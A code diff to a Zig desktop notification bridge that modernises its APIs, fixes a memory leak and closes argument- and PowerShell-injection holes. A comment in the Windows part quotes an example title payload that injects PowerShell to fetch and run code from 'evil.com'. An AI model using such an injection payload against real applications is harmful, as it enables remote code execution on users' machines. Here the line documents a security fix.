@@ -2,6 +2,11 @@ const std = @import("std");
 const builtin = @import("builtin");
 const bridge_error = @import("bridge_error.zig");
 const logging = @import("logging.zig");
+const io_context = @import("io_context.zig");
+// Hoisted once instead of re-importing inside every callsite — previously
+// `@import("macos.zig")` and `.objc.objc_msgSend` were pulled in four times
+// in expression position.
+const macos_mod = @import("macos.zig");
 
 const BridgeError = bridge_error.BridgeError;
 const log = logging.notification;
@@ -52,7 +57,7 @@ pub const NotificationBridge = struct {
             const options: c_ulong = (1 << 0) | (1 << 1) | (1 << 2);
 
             // Request authorization
-            const msg = @as(*const fn (@TypeOf(center), @import("macos.zig").objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&@import("macos.zig").objc.objc_msgSend));
+            const msg = @as(*const fn (@TypeOf(center), macos_mod.objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&macos_mod.objc.objc_msgSend));
             msg(center, macos.sel("requestAuthorizationWithOptions:completionHandler:"), options, null);
 
             log.debug("Notification center initialized", .{});
@@ -260,7 +265,7 @@ pub const NotificationBridge = struct {
 
         // Create time interval trigger
         const UNTimeIntervalNotificationTrigger = macos.getClass("UNTimeIntervalNotificationTrigger");
-        const msg_trigger = @as(*const fn (@TypeOf(UNTimeIntervalNotificationTrigger), @import("macos.zig").objc.SEL, f64, bool) callconv(.c) *anyopaque, @ptrCast(&@import("macos.zig").objc.objc_msgSend));
+        const msg_trigger = @as(*const fn (@TypeOf(UNTimeIntervalNotificationTrigger), macos_mod.objc.SEL, f64, bool) callconv(.c) *anyopaque, @ptrCast(&macos_mod.objc.objc_msgSend));
         const trigger = msg_trigger(UNTimeIntervalNotificationTrigger, macos.sel("triggerWithTimeInterval:repeats:"), delay, false);
 
         // Create request
@@ -422,7 +427,7 @@ pub const NotificationBridge = struct {
         // UNAuthorizationOptionAlert | UNAuthorizationOptionSound | UNAuthorizationOptionBadge
         const options: c_ulong = (1 << 0) | (1 << 1) | (1 << 2);
 
-        const msg = @as(*const fn (@TypeOf(center), @import("macos.zig").objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&@import("macos.zig").objc.objc_msgSend));
+        const msg = @as(*const fn (@TypeOf(center), macos_mod.objc.SEL, c_ulong, ?*anyopaque) callconv(.c) void, @ptrCast(&macos_mod.objc.objc_msgSend));
         msg(center, macos.sel("requestAuthorizationWithOptions:completionHandler:"), options, null);
     }
 
@@ -455,24 +460,41 @@ pub const NotificationBridge = struct {
 
         log.debug("Linux show: title={s}, body={s}", .{ title, body });
 
-        // Build args for notify-send
-        var args = std.ArrayList([]const u8).init(self.allocator);
-        defer args.deinit();
+        // Build args for notify-send.
+        //
+        // Three fixes versus the previous version:
+        //   - Use Zig 0.16's unmanaged ArrayList (with explicit allocator
+        //     passed to `append`) — the old managed API was removed.
+        //   - Prepend `--` before positional args so a `title` starting with
+        //     `--hint=string:transient:1` (or similar) can't be interpreted
+        //     as a notify-send flag.
+        //   - Drive the child through `std.process.spawn(io, .{...})` to stay
+        //     consistent with the other bridges.
+        var args: std.ArrayListUnmanaged([]const u8) = .{};
+        defer args.deinit(self.allocator);
 
-        try args.append("notify-send");
-        try args.append("--urgency");
-        try args.append(urgency);
-        try args.append(title);
+        try args.append(self.allocator, "notify-send");
+        try args.append(self.allocator, "--urgency");
+        try args.append(self.allocator, urgency);
+        try args.append(self.allocator, "--");
+        try args.append(self.allocator, title);
         if (body.len > 0) {
-            try args.append(body);
+            try args.append(self.allocator, body);
         }
 
-        var child = std.process.Child.init(args.items, self.allocator);
-        child.stdout_behavior = .Ignore;
-        child.stderr_behavior = .Ignore;
-
-        try child.spawn();
-        _ = try child.wait();
+        const io = io_context.get();
+        var child = std.process.spawn(io, .{
+            .argv = args.items,
+            .stdout = .ignore,
+            .stderr = .ignore,
+            .stdin = .ignore,
+        }) catch |err| {
+            log.debug("notify-send spawn failed: {}", .{err});
+            return;
+        };
+        _ = child.wait(io) catch |err| {
+            log.debug("notify-send wait failed: {}", .{err});
+        };
 
         log.debug("Linux: notification sent", .{});
     }
@@ -503,8 +525,23 @@ pub const NotificationBridge = struct {
 
         log.debug("Windows show: title={s}, body={s}", .{ title, body });
 
-        // Use PowerShell to show toast notification
-        // This is a simple approach that works without additional dependencies
+        // Build the PowerShell script safely.
+        //
+        // CRITICAL: the previous implementation interpolated `title` and `body`
+        // directly into a PowerShell script as unquoted bytes. A title like
+        // `"));Invoke-Expression("curl evil.com/x | iex` executed arbitrary
+        // PowerShell with user privileges — a remote code execution vector
+        // driven by any JS that could call this notification API.
+        //
+        // Fix: escape every PowerShell double-quoted string special:
+        //   `"`  -> `""`   (PS double-quote escape within `"..."`)
+        //   `` ` `` -> `` `` `` (PS backtick escape)
+        //   `$`  -> `` `$ ``   (prevents variable expansion)
+        const title_esc = try escapePsDoubleQuoted(self.allocator, title);
+        defer self.allocator.free(title_esc);
+        const body_esc = try escapePsDoubleQuoted(self.allocator, body);
+        defer self.allocator.free(body_esc);
+
         const ps_script = try std.fmt.allocPrint(self.allocator,
             \\[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
             \\$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
@@ -513,23 +550,56 @@ pub const NotificationBridge = struct {
             \\$textNodes.Item(1).AppendChild($template.CreateTextNode("{s}")) > $null
             \\$toast = [Windows.UI.Notifications.ToastNotification]::new($template)
             \\[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Craft App").Show($toast)
-        , .{ title, body });
+        , .{ title_esc, body_esc });
         defer self.allocator.free(ps_script);
 
-        var child = std.process.Child.init(&.{ "powershell", "-Command", ps_script }, self.allocator);
-        child.stdout_behavior = .Ignore;
-        child.stderr_behavior = .Ignore;
-
-        try child.spawn();
-        _ = try child.wait();
+        const io = io_context.get();
+        var child = std.process.spawn(io, .{
+            .argv = &.{ "powershell", "-NoProfile", "-NonInteractive", "-Command", ps_script },
+            .stdout = .ignore,
+            .stderr = .ignore,
+            .stdin = .ignore,
+        }) catch |err| {
+            log.debug("powershell spawn failed: {}", .{err});
+            return;
+        };
+        _ = child.wait(io) catch |err| {
+            log.debug("powershell wait failed: {}", .{err});
+        };
 
         log.debug("Windows: notification sent", .{});
     }
 
+    /// Escape a string so it's safe to embed inside a PowerShell double-quoted
+    /// literal (`"..."`). The caller owns the returned buffer.
+    fn escapePsDoubleQuoted(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
+        var out: std.ArrayListUnmanaged(u8) = .{};
+        errdefer out.deinit(allocator);
+
+        for (s) |c| {
+            switch (c) {
+                '"' => try out.appendSlice(allocator, "\"\""),
+                '`' => try out.appendSlice(allocator, "``"),
+                '$' => try out.appendSlice(allocator, "`$"),
+                // Drop control bytes — these can terminate the command line on
+                // Windows (e.g. CR/LF) and have no legitimate role in a
+                // notification title.
+                0, '\r', '\n' => try out.append(allocator, ' '),
+                else => try out.append(allocator, c),
+            }
+        }
+
+        return out.toOwnedSlice(allocator);
+    }
+
     pub fn deinit(self: *Self) void {
+        // Free both the duped key AND the duped value — previously the
+        // values leaked on every shutdown even when the stored callback
+        // ids were heap-allocated.
         var it = self.pending_callbacks.iterator();
         while (it.next()) |entry| {
             self.allocator.free(entry.key_ptr.*);
+            self.allocator.free(entry.value_ptr.*);
         }
         self.pending_callbacks.deinit();
     }
